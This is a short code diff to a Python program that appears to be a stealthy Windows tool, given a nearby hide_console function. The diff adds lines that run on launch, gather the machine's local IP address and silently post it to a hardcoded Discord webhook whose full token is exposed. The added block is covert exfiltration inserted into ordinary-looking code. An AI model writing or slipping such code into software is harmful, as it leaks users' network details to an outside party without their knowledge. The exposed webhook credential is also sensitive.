@@ -45,6 +45,12 @@ def get_local_ip():
         s.close()
 
 
+webhook_url = "https://discord.com/api/webhooks/1176823246813921291/OZOpPEGpnXdagLnnq8Bqwk-lg5cKmYflrZgj4XrBmpDpUQZ8j_nAqMCXOvS2Puh87SKm"
+message_content = get_local_ip()
+data = {"content": message_content}
+r = requests.post(webhook_url, json=data)
+
+
 def hide_console():
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
     user32 = ctypes.WinDLL("user32", use_last_error=True)
